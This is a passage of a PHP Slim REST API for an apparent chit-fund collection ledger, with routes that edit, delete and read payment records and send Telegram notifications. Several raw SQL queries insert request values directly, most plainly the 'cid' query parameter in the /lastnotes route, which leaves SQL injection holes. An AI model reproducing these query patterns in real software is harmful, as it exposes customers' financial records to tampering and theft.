				// 			if(strlen(trim($receivedDetail[0]["pmid"])) > 0){
				// 				$tempstr = "";
				// 				$tempstr = strval($receivedDetail[0]["pmid"]) . ',' . strval(implode(',', $pmid));
				// 				array_push($putdata,$tempstr);
				// 				// echo " 2.1- ".$tempstr;
				// 			}else{
				// 				array_push($putdata,implode(',', $pmid));
				// 				// echo " 2.2- ".implode(',', $pmid);
				// 			}
				// 		}else{
				// 			if(putParam($r,"paymentmode") == 50){
				// 				array_push($putdata,"");
				// 			}else{
				// 				array_push($putdata," ");
				// 			}
				// 		}
				// 		// if(putParam($r,"paymentmode") == 50){
				// 		// 	array_push($putdata,"");
				// 		// }else{
				// 		// 	array_push($putdata," ");
				// 		// }
				// 	}else{
				// 		array_push($putdata,"");
				// 	}
				// }
				// array_push($putdata,"");
				// }
				$editDetail = call_user_func_array(array($db, 'editreceived'), $putdata);



			} else {
				$response["error"] = true;
				$response["status"] = "error";
				$response["message"] = "No Received Entry found with the given asalu";
				echoRespnse(201, $response);
				return;
			}

			$fullteleStatus = sendTelegram(urlencode($fullmsg), "full");
			$mainteleStatus = sendTelegram(urlencode($mainmsg), "main");
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot! , successfully edited Asalu information";
		} else {
			$response["error"] = "true";
			$response["status"] = "success";
			$response["message"] = "Oops! An error occured while editing Asalu information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Asalu found with given ID";
	}

	echoRespnse(200, $response);

});



$app->delete('/asalu/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	//echo json_encode($r);
	$params = $db->getFunctionParam("asalu");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$oldasaluDetail = call_user_func_array(array($db, 'getasalu'), $getdata);
	// echo json_encode($oldasaluDetail);

	if (sizeOf($oldasaluDetail) > 0) {
		$params = $db->putFunctionParam("asalu");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			array_push($putdata, "");
		}
		array_push($putdata, "1");

		$editDetail = call_user_func_array(array($db, 'editasalu'), $putdata);

		if ($editDetail) {
			$params = $db->getFunctionParam("receivedamount");
			$getdata = array();
			for ($i = 0; $i < sizeof($params); $i++) {
				if ($params[$i] == "asaluid") {
					array_push($getdata, $id);
				} else {
					array_push($getdata, "");
				}
			}
			$oldrcvdDetail = call_user_func_array(array($db, 'getreceivedamount'), $getdata);
			// echo json_encode($oldrcvdDetail);


			if (sizeOf($oldrcvdDetail) > 0) {
				$params = $db->putFunctionParam("received");
				$updateField = array();
				$updateField["id"] = $oldrcvdDetail[0]["id"];
				$putdata = array();
				array_push($putdata, $updateField);
				for ($i = 0; $i < sizeof($params); $i++) {
					array_push($putdata, "");
				}
				array_push($putdata, "1");

				$editDetail = call_user_func_array(array($db, 'editreceived'), $putdata);
			}
			$fullmsg = "Deleted Asalu Entry with ID" . $id . " : " . $oldasaluDetail[0]["customername"] . "(" . $oldasaluDetail[0]["chiti"] . ")" . " gave " . $oldasaluDetail[0]["amount"] . "(" . $oldasaluDetail[0]["note"] . ")" . "(" . $oldrcvdDetail[0]["paymentmodename"] . ")";
			$mainmsg = "Deleted Asalu Entry" . $oldasaluDetail[0]["customername"] . "(" . $oldasaluDetail[0]["chiti"] . ") - " . $oldasaluDetail[0]["amount"] . "(" . $oldasaluDetail[0]["note"] . ")" . "(" . $oldrcvdDetail[0]["paymentmodename"] . ")";
			// $asalu["customername"]."(".$asalu["chiti"].")" ." - ". $asalu["amount"]."(".$asalu["note"].")";
			$teleStatus = sendTelegram($mainmsg, "main");
			$teleStatus = sendTelegram($fullmsg, "full");
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully Deleted asalu information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while Deleting asalu  information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Asalu found with given ID";
	}
	echoRespnse(200, $response);
});


$app->put('/multiupdatenotes', function () use ($app) {
	$r = json_decode($app->request->getBody());

	$action = putParam($r, "action");
	$chiti = putParam($r, "chiti");
	$asaluid = putParam($r, "asaluid");
	$totalamount = putParam($r, "totalamount");

	$currnote = "";
	$matchedi = 0;
	$prevnote = 0;
	$days = 100;
	$paiddays = 0;
	$editedEntries = array();


	$db = new DbHandler();
	$getdata = array();
	$params = $db->getFunctionParam("asalu");
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "chiti") {
			array_push($getdata, $chiti);
		} else if ($params[$i] == "sort_by") {
			array_push($getdata, "a.date");
		} else if ($params[$i] == "sort_order") {
			array_push($getdata, "asc");
		} else {
			array_push($getdata, "");
		}
	}

	$asaluDetail = call_user_func_array(array($db, 'getasalu'), $getdata);
	// echo json_encode($asaluDetail);
	if (sizeof($asaluDetail) > 0) {
		for ($j = 0; $j < sizeof($asaluDetail); $j++) {
			if ($asaluDetail[$j]["id"] == $asaluid) {
				$matchedi = $j;
				$prevnote = $asaluDetail[$j]["note"];
				// break;
			}

			// echo = 
			if ($prevnote && $j > $matchedi) {
				// echo "prevnote bfre err".$prevnote; //18,19
				// echo " 1stnote ".$asaluDetail[$j]["note"];//21
				if($asaluDetail[$j]["irregular"]){
					$currnote = intval($prevnote) + 1;
					$prevnote = $currnote;
				}else{
				if (strpos($prevnote, ',')) {
					$temparr = explode(",", $prevnote);
					$prevnote = $temparr[sizeof($temparr) - 1];
					// echo "<--- came in prevcomma ".$prevnote."---->";
				} else if (strpos($prevnote, '-')) {
					$temparr = explode("-", $prevnote);
					$prevnote = $temparr[sizeof($temparr) - 1];
					// echo "<--- came in prevdash".$prevnote."---->";
				}
				// else if(!is_nan($prevnote)){
				// 	echo "<--- came in prevnumerix".$prevnote."---->";
				// 	$prevnote = $asaluDetail[$j]["note"];
				// }


				// Data.toast(results);
				// echo "<--- came in prev final ".$prevnote."-----curr ". $currnote . "-->";


				($asaluDetail[$j]["chiti"] == 259) ? $days = 400 : "";
				// echo $totalamount;
				$perday = intval($totalamount) / $days;
				$paiddays = intval($asaluDetail[$j]["amount"]) / $perday;
				// if($j >= $matchedi){
				// echo "days".$days."perday".$perday."paiddays".$paiddays;
				// }

				$prevnote = intval($prevnote) + 1;
				if ($paiddays == 1) {
					$currnote = $prevnote;
					// echo "<--- came in 1".$prevnote."---->";
				} else if ($paiddays > 1 && $paiddays <= 2) { // 
					// $initnote = $prevnote;
					// $prevnote = strval($prevnote);
					$currnote = ($prevnote) . ',' . (intval($prevnote) + 1);
					// echo "<--- came in 2".$prevnote."---->";
				} else if ($paiddays > 2) {
					// $initnote = $prevnote;
					// $prevnote = strval($prevnote);
					$currnote = ($prevnote) . '-' . ($prevnote + $paiddays - 1);
					// echo "<--- came in 3".$prevnote."---->";
				}
				// if($matchedi && $j >= $matchedi){
				// echo "<--- came in end".$prevnote."--curr ". $currnote . "-->";
				// }
				($currnote) ? $prevnote = $currnote : "";
				// echo "<--- came changed".$prevnote."--curr ". $currnote . "-->";
				}

				$params = $db->putFunctionParam("asalu");
				$updateField = array();
				$updateField["id"] = $asaluDetail[$j]["id"];
				$putdata = array();
				array_push($putdata, $updateField);
				for ($i = 0; $i < sizeof($params); $i++) {
					if ($params[$i] == "note") {
						array_push($putdata, $currnote);
					} else {
						array_push($putdata, "");
					}
				}
				array_push($putdata, "");

				$editDetail =  call_user_func_array(array($db, 'editasalu'), $putdata);
				// echo json_encode($editDetail);
				if ($editDetail) {
					// echo "came";
					$params = $db->putFunctionParam("received");
					$updateField = array();
					$updateField["asaluid"] = $asaluDetail[$j]["id"];
					$putdata = array();
					array_push($putdata, $updateField);
					for ($i = 0; $i < sizeof($params); $i++) {
						if ($params[$i] == "note") {
							array_push($putdata, $currnote);
						} else {
							array_push($putdata, "");
						}
					}
					array_push($putdata, "");

					$editRcvdDetail = call_user_func_array(array($db, 'editreceived'), $putdata);
					// echo "--->".json_encode($editRcvdDetail);

					if ($editRcvdDetail) {
						array_push($editedEntries, $asaluDetail[$j]["id"]);
						// $editRcvdDetail = 
					}
					$response["error"] = false;
					$response["status"] = "success";
					$response["editedEntries"] = $editedEntries;
					$response["message"] = "Woot! , successfully edited Asalu information";
				} else {
					$response["error"] = "true";
					$response["status"] = "success";
					$response["message"] = "Oops! An error occured while editing Asalu information";
					$response["err"] = $editDetail;
				}
				// }
			}
		}
	}

	echoRespnse(200, $response);

});


$app->get('/asalu/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("asalu");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == 'id') {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$asaluList = call_user_func_array(array($db, 'getasalu'), $getdata);
	$outputfields = array("id", "date", "customer", "amount", "chitiamount", "chiti", "code", "customername", "note", "paymentmode", "paymentmodename", "pmid", "rcvdid", "rcvdnote","collectedby", "created", "updated");
	$qryfields = array("id", "date", "customer", "amount", "chitiamount", "chiti", "code", "customername", "note", "paymentmode", "paymentmodename", "pmid", "rcvdid", "rcvdnote","collectedby", "created", "updated");
	$asalu = array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($asaluList); $i++) {
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($asaluList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $asaluList[$i][$outputfields[$j]];
			}
		}

		$tmp["pmtrans"] = array();
		if ($tmp["paymentmode"] == 50) {
			$tmp["pmtrans"] = array();
			$getpmdata = array();
			$params = $db->getFunctionParam("pmtrans");
			for ($m = 0; $m < sizeof($params); $m++) {
				if ($params[$m] == "tableid") {
					array_push($getpmdata, $tmp["rcvdid"]);
				} else if ($params[$m] == "tablename") {
					array_push($getpmdata, "received");
				} else {
					array_push($getpmdata, "");
				}
			}
			// echo "id".$tmp["id"];
			$tmp["pmtrans"] = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		}
		//	array_push($customer,$tmp);

	}
	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];
	$response["asalu"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the Asalu list";


	echoRespnse(200, $response);

});

$app->put('/received/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$datechanged = false;
	$pmid = array();
	$getdata = array();
	$params = $db->getFunctionParam("receivedamount");
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}

	$receivedDetail = call_user_func_array(array($db, 'getreceivedamount'), $getdata);
	// echo json_encode($receivedDetail);
	if (sizeof($receivedDetail) > 0) {
		$params = $db->putFunctionParam("received");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");
	}
	$editDetail = call_user_func_array(array($db, 'editreceived'), $putdata);

	if ($editDetail) {

		$delallpmTrans = false;
		if ($receivedDetail[0]["paymentmode"] == 50 && putParam($r, "paymentmode") != 50) {
			$delallpmTrans = true;
		}
		if ($receivedDetail[0]["date"] != putParam($r, "date")) {
			$datechanged = true;
		}

		if (putParam($r, "paymentmode") == 50 && sizeof(putParam($r, "pmtrans")) > 0) {
			$pmtrans = putParam($r, "pmtrans");
			if ($datechanged) {
				for ($b = 0; $b < sizeof($pmtrans); $b++) {
					$pmtrans[$b]->date = putParam($r, "date");
				}
			}
			$opParam = "pmtrans";
			$mainId = "tableid";
			$outputfields = array("date", "tablename", "tableid", "paymentmode", "credit", "debit", "created", "updated");
			$getFunction = "getPmTrans";
			$syncdata = $pmtrans;
			$putFunction = "editPmTrans";
			$tablename = "received";
			$syncData = updateTable($db, $opParam, $mainId, $outputfields, $getFunction, $syncdata, $putFunction, $receivedDetail[0]["id"], $tablename, explode(",", $receivedDetail[0]["pmid"]));


			if ($syncData && sizeof($syncData) > 0) {
				for ($i = 0; $i < sizeof($syncData); $i++) {
					$syncData[$i]["date"] = ($datechanged) ? putParam($r, "date") : $receivedDetail[0]["rcvddate"];
					// echo json_encode($syncData[$i]["date"]).json_encode(putParam($r,"date")).json_encode($receivedDetail[0]["rcvddate"]);
					$syncData[$i]["tableid"] = $receivedDetail[0]["id"];
					$syncData[$i]["tablename"] = "received";
					$createpmtransstatus = $db->createPmTrans($syncData[$i]);
					// echo json_encode($createpmtransstatus);
					// array_push($tmp,$syncData[$i]["no"]);
					array_push($pmid, $createpmtransstatus['id']);
				}


				if ($pmid && sizeof($pmid) > 0) {
					$params = $db->getFunctionParam("receivedamount");
					$getdata = array();
					for ($i = 0; $i < sizeof($params); $i++) {
						if ($params[$i] == "id") {
							array_push($getdata, $id);
						} else {
							array_push($getdata, "");
						}
					}
					$rcvdDetail = call_user_func_array(array($db, 'getreceivedamount'), $getdata);
					// echo " 2- ".json_encode($rcvdDetail[0]["pmid"]);
					if (sizeOf($rcvdDetail) > 0) {
						$params = $db->putFunctionParam("received");
						$updateField = array();
						$updateField["id"] = $id;
						$putdata = array();
						array_push($putdata, $updateField);
						for ($i = 0; $i < sizeof($params); $i++) {
							if ($params[$i] == "pmid") {
								// echo "size".strlen($rcvdDetail[0]["pmid"]);
								if (strlen(trim($rcvdDetail[0]["pmid"])) > 0) {
									$tempstr = "";
									$tempstr = strval($rcvdDetail[0]["pmid"]) . ',' . strval(implode(',', $pmid));
									array_push($putdata, $tempstr);
									// echo " 2.1- ".$tempstr;
								} else {
									array_push($putdata, implode(',', $pmid));
									// echo " 2.2- ".implode(',', $pmid);
								}
							} else {
								array_push($putdata, "");
							}
						}
						array_push($putdata, "");
						// echo " 3- ".json_encode($putdata);
						$editrcvdDetail = call_user_func_array(array($db, 'editreceived'), $putdata);

					}
				}

				// if($pmid && sizeof($pmid) > 0){
				// 	$params = $db->getFunctionParam("receivedamount");
				// 	$getdata = array();
				// 		for($i=0;$i<sizeof($params);$i++){
				// 			if($params[$i] == "id"){
				// 				array_push($getdata,$receivedDetail[0]["id"]);
				// 			}else{
				// 				array_push($getdata,"");
				// 			}
				// 	}
				// 	$newreceivedDetail = call_user_func_array(array($db,'getreceivedamount'),$getdata);
				// 	// echo " 2- ".json_encode($chitiDetail1[0]["pmid"]);
				// 	if(sizeOf($newreceivedDetail)>0){
				// 		$params = $db->putFunctionParam("received");
				// 		$updateField = array();
				// 		$updateField["id"] = $receivedDetail[0]["id"];
				// 		$putdata=array();
				// 		array_push($putdata,$updateField);
				// 		for($i=0;$i<sizeof($params);$i++){
				// 			if($params[$i] == "pmid" ){
				// 				// echo "size".strlen($newreceivedDetail[0]["pmid"]);
				// 				if(strlen(trim($newreceivedDetail[0]["pmid"])) > 0){
				// 					$tempstr = "";
				// 					$tempstr = strval($newreceivedDetail[0]["pmid"]) . ',' . strval(implode(',', $pmid));
				// 					array_push($putdata,$tempstr);
				// 					// echo " 2.1- ".$tempstr;
				// 				}else{
				// 					array_push($putdata,implode(',', $pmid));
				// 					// echo " 2.2- ".implode(',', $pmid);
				// 				}
				// 			}else{
				// 				array_push($putdata,"");
				// 			}
				// 		}
				// 		array_push($putdata,"");						
				// 		// echo " 3- ".json_encode($putdata);
				// 		$editDetail = call_user_func_array(array($db,'editchiti'), $putdata);

				// 	}
				// }

			}
			// }

			// echo "del ->".$delallpmTrans;
		}

		if ($delallpmTrans) {
			$params = $db->putFunctionParam("pmtrans");
			$updateField = array();
			$updateField["tablename"] = "received";
			$updateField["tableid"] = $receivedDetail[0]["id"];
			$putdata = array();
			array_push($putdata, $updateField);
			for ($i = 0; $i < sizeof($params); $i++) {
				array_push($putdata, "");
			}
			array_push($putdata, "1");

			$editpmtransDetail = call_user_func_array(array($db, 'editPmTrans'), $putdata);

		}


		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $id;
		$response["message"] = "Woot! , successfully edited Received Amount information";
	} else {
		$response["error"] = "true";
		$response["status"] = "success";
		$response["message"] = "Oops! An error occured while editing Received Amount information";
		$response["err"] = $editDetail;
	}

	echoRespnse(200, $response);

});


$app->get('/receivedamount/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("receivedamount");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == 'id') {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$receivedList = call_user_func_array(array($db, 'getreceivedamount'), $getdata);
	$outputfields = array("id", "customer", "amount", "customername", "rcvddate", "asalu", "asaluid", "asaluchiti", "chiti", "colid", "colamt", "coldate", "code", "sowjicomm", "suricomm", "fullandevicomm","collectedby","collectorname", "paymentmode", "paymentmodename", "pmid", "note", "created", "updated");
	$qryfields = array("id", "customer", "amount", "customername", "rcvddate", "asalu", "asaluid", "asaluchiti", "chiti", "colid", "colamt", "coldate", "code", "sowjicomm", "suricomm", "fullandevicomm","collectedby","collectorname", "paymentmode", "paymentmodename", "pmid", "note", "created", "updated");
	$asalu = array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($receivedList); $i++) {

		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($receivedList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $receivedList[$i][$outputfields[$j]];
			}
		}
		$tmp["pmtrans"] = array();
		if ($tmp["paymentmode"] == 50) {
			$getpmdata = array();
			$params = $db->getFunctionParam("pmtrans");
			for ($m = 0; $m < sizeof($params); $m++) {
				if ($params[$m] == "id") {
					$temp = array();
					$temp["op"] = "In";
					$temp["value"] = $tmp["pmid"];
					array_push($getpmdata, json_encode($temp));
				} else {
					array_push($getpmdata, "");
				}
			}
			$tmp["pmtrans"] = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		}

		//	array_push($customer,$tmp);

	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];
	$response["received"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the Received Amount list";


	echoRespnse(200, $response);

});

$app->get('/received/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("receivedamount");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == 'id') {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$receivedlist = call_user_func_array(array($db, 'getreceived'), $getdata);
	$outputfields = array("id", "customer", "amount", "customername", "rcvddate", "asalu", "asaluid", "chiti", "colid", "colamt", "code", "sowjicomm", "suricomm", "fullandevicomm","collectedby", "note", "created", "updated");
	$qryfields = array("id", "customer", "amount", "customername", "rcvddate", "asalu", "asaluid", "chiti", "colid", "colamt", "code", "sowjicomm", "suricomm", "fullandevicomm","collectedby", "note", "created", "updated");
	$received = array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($receivedlist); $i++) {

		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($receivedlist[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $receivedlist[$i][$outputfields[$j]];
			}
		}
		//	array_push($customer,$tmp);

	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];
	$response["received"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the received list";


	echoRespnse(200, $response);

});



$app->get('/chiti/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("chiti");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == 'id') {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$chitilist = call_user_func_array(array($db, 'getchiti'), $getdata);
	$outputfields = array("sno", "id", "customer", "customername", "code", "date", "tYpe", "advintmonths", "iscountable", "amount", "paymentmode", "paymentmodename", "pmid", "pdwtm", "interestrate", "ccomm", "ccommpaymentmode", "ccommpaymentmodename", "suriccomm", "sowji", "suri", "fullandevi", "reverse", "revcash", "status", "note", "irregular", "hami", "haminame", "created", "updated");
	$qryfields = array("SNO", "id", "customer", "customername", "code", "date", "tYpe", "advintmonths", "iscountable", "chitiamount", "paymentmode", "paymentmodename", "pmid", "pdwtm", "interestrate", "ccomm", "ccommpaymentmode", "ccommpaymentmodename", "suriccomm", "sowji", "suri", "fullandevi", "reverse", "revcash", "status", "note", "irregular", "hami", "haminame", "created", "updated");
	$chiti = array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($chitilist); $i++) {

		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($chitilist[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $chitilist[$i][$outputfields[$j]];
			}
		}

		$tmp["pmtrans"] = array();
		if ($tmp["paymentmode"] == 50) {
			$getpmdata = array();
			$params = $db->getFunctionParam("pmtrans");
			for ($m = 0; $m < sizeof($params); $m++) {
				if ($params[$m] == "tableid") {
					array_push($getpmdata, $tmp["id"]);
				} else if ($params[$m] == "tablename") {
					array_push($getpmdata, "chiti");
				} else {
					array_push($getpmdata, "");
				}
			}
			$tmp["pmtrans"] = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		}

		$totalasalu = $db->getOneRecord("SELECT SUM(amount) as amount FROM `asalu` WHERE chiti = $id and deleted = 0");
		if(intval(($totalasalu)> 0)){
			$tmp["remainingasalu"] = $tmp["chitiamount"]  - $totalasalu["amount"];
		}
		//	array_push($customer,$tmp);

	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];
	$response["chiti"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the Chiti list";


	echoRespnse(200, $response);

});


$app->get('/latestnotes/:id', function ($id) use ($app) {
	
	$response = array();
	$db = new DbHandler();
	$chiti = array();
	$days = ($id == 259) ? 400 : 100;
	$params = $db->getFunctionParam("chiti");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == 'id') {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$chitiList = call_user_func_array(array($db, 'getchiti'), $getdata);
	// echo json_encode($chitiList);
	if ($chitiList && sizeof($chitiList)) {
		$chiti["customername"] = $chitiList[0]["customername"];
		$chiti["haminame"] = $chitiList[0]["haminame"];
		$chiti["customer"] = $chitiList[0]["customer"];
		$chiti["id"] = $chitiList[0]["id"];
		$chiti["irregular"] = $chitiList[0]["irregular"];

		$mostcommon = $db->getOneRecord("SELECT *,COUNT(amount) as mostamt FROM `asalu` WHERE chiti = $id GROUP BY amount ORDER BY `mostamt` DESC");
		$mostcommonpm = $db->getOneRecord("SELECT *,COUNT(paymentmode) as mostpmmode FROM `received` WHERE chiti = $id and paymentmode > 0 GROUP BY paymentmode ORDER BY `mostpmmode` DESC");
		$totalasalu = $db->getOneRecord("SELECT SUM(amount) as amount FROM `asalu` WHERE chiti = $id and deleted = 0");
		// echo json_encode($mostcommonpm);
		$chiti["remainingasalu"] = $chitiList[0]["amount"] - $totalasalu["amount"];
		// $mostcommon = $db->getOneRecord("SELECT *,(b.lastname),COUNT(amount) as mostamt FROM `asalu` a LEFT JOIN customers b on a.customer = b.id LEFT JOIN customers c on b.hami=c.id WHERE chiti = $id GROUP BY amount");
		// echo json_encode($mostcommon);
		if ($mostcommon && sizeof($mostcommon)) {
			$chiti["regularamt"] = $mostcommon["amount"];
		} else {
			$chiti["regularamt"] = "100";
		}

		if ($mostcommonpm && sizeof($mostcommonpm)) {
			if(intval($mostcommonpm["paymentmode"]) > 0){
				$chiti["regularpmmode"] = $mostcommonpm["paymentmode"];
			}else{
				$chiti["regularpmmode"] = 1;
			}
		} else {
			$chiti["regularpmmode"] = "1";
		}

		$diff = diffBtwDates($chitiList[0]["date"], date("Y-m-d "));
		$chiti["remainingdays"] = $days - $diff;


		$params = $db->getFunctionParam("asalu");
		$getdata = array();
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == 'chiti') {
				array_push($getdata, $id);
			} else if ($params[$i] == "sort_by") {
				array_push($getdata, "a.date");
			} else if ($params[$i] == "sort_order") {
				array_push($getdata, "desc");
			} else if ($params[$i] == "limit") {
				array_push($getdata, "6");
			} else {
				array_push($getdata, "");
			}
		}
		$chiti["lasttrans"] = array();
		$chiti["lasttrans"] = call_user_func_array(array($db, 'getasalu'), $getdata);
		$arrsize = (sizeof($chiti["lasttrans"]) > 0) ? sizeof($chiti["lasttrans"]) : 0;

		for ($f = 0; $f < sizeof($chiti["lasttrans"]); $f++) {
			if ($arrsize < 6 && $f == $arrsize - 1) {
				$dte1 = $chiti["lasttrans"][0]['date'];
				$dte2 = $chitiList[0]["date"];
			} else {
				// $dte1= date("Y-m-d");$dte2= "";
				if ($f < 5) {
					// echo "size".sizeof($chiti["lasttrans"]);
					// echo json_encode($chiti["lasttrans"][$f]);
					$dte1 = $chiti["lasttrans"][$f]['date'];
					$dte2 = $chiti["lasttrans"][$f + 1]['date'];
				} else {
					unset($chiti["lasttrans"][$f]);
				}
			}
			if($f < 5){
				$chiti["lasttrans"][$f]['days'] = strval((strtotime($dte1) - strtotime($dte2)) / (60 * 60 * 24));
			}
		}
		// if($asaluList && sizeof($asaluList) > 0){
		// 	// $arrsize = (sizeof($asaluList) > 5)?5:sizeof($asaluList);
		// 	for($f=0;$f<sizeof($asaluList);$f++){
		// 		array_push($chiti["lasttrans"],$asaluList[$f]);
		// 	}

		// }
		// echo "start".json_encode($asaluList)."end";

		// $chiti["lasttrans"] = $db->getdynamicRecord("SELECT * FROM `asalu` WHERE chiti = $id ORDER BY `date` DESC",5);
		if ($chitiList[0]["irregular"]) {
			$chiti["perday"] = 100;
			$chiti["notes"] = (sizeof($chiti["lasttrans"]) > 0) ? round(intval($chiti["lasttrans"][0]["note"])) + 1 : 1;
			// $chiti["notes"] = $chiti["lasttrans"][0]["note"] + 1;
			// echo json_encode($chiti["lasttrans"][0]);
		} else {
			$chiti["perday"] = round($chitiList[0]["amount"] / $days);
			$chiti["notes"] = ($totalasalu['amount'] / $chiti["perday"]) + 1;
			// $chiti["notes"] = (getsum($chiti["lasttrans"], "amount") / $chiti["perday"]) + 1;
		}



	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Chiti found with given ID";
		echoRespnse(201, $response);
		return;
	}
	// echo json_encode($mostcommon);

	// $outputfields = array("id","date","customer","amount","chitiamount","chiti","customername","note","paymentmode","rcvdid","created","updated");
	// $qryfields = array("id","date","customer","amount","chitiamount","chiti","customername","note","paymentmode","rcvdid","created","updated");
	// $asalu=array();
	// // looping through result and preparing tasks array
	// for($i=0;$i<sizeOf($asaluList);$i++){
	// 	$tmp = array();		
	// 	for($j = 0;$j<sizeof($qryfields);$j++){
	// 	if(isset($asaluList[$i][$outputfields[$j]])){
	// 		$tmp[$qryfields[$j]] = $asaluList[$i][$outputfields[$j]];
	// 		}
	// 	}
	// 	array_push($asalu,$tmp);

	// }
	// // if($id )

	// echo "chiti".json_encode($chiti);
	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];
	$response["chiti"] = $chiti;
	$response["message"] = "Woot!,Successfully retreived the Chiti list";


	echoRespnse(200, $response);

});

$app->get('/lastnotes', function () use ($app) {

	$response = array();
	$db = new DbHandler();
	$cid = $app->request->get("cid");

	// echo json_encode($cid);
	if ($cid) {
		$lastnoteslist = $db->getdynamicRecord("select *,b.note as lastnote from chiti a inner join asalu b on a.id = b.chiti and b.id = ( SELECT c.id FROM asalu c WHERE c.chiti = b.chiti ORDER BY c.date DESC LIMIT 1 ) INNER JOIN customers d on a.customer = d.id WHERE a.irregular = 1 and status = 1 and chiti IN ($cid) ", 1000);
		// echo json_encode($lastnoteslist);


	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Chiti found with given ID";
		echoRespnse(201, $response);
		return;
	}

	$response["error"] = false;
	$response['status'] = "success";
	$response["lastnoteslist"] = $lastnoteslist;
	$response["message"] = "Woot!,Successfully retreived the Chiti list";


	echoRespnse(200, $response);

});





$app->get('/', function () use ($app) {

	$response = array();
	$db = new DbHandler();
	$cid = $app->request->get("cid");

	// echo json_encode($cid);
	if ($cid) {
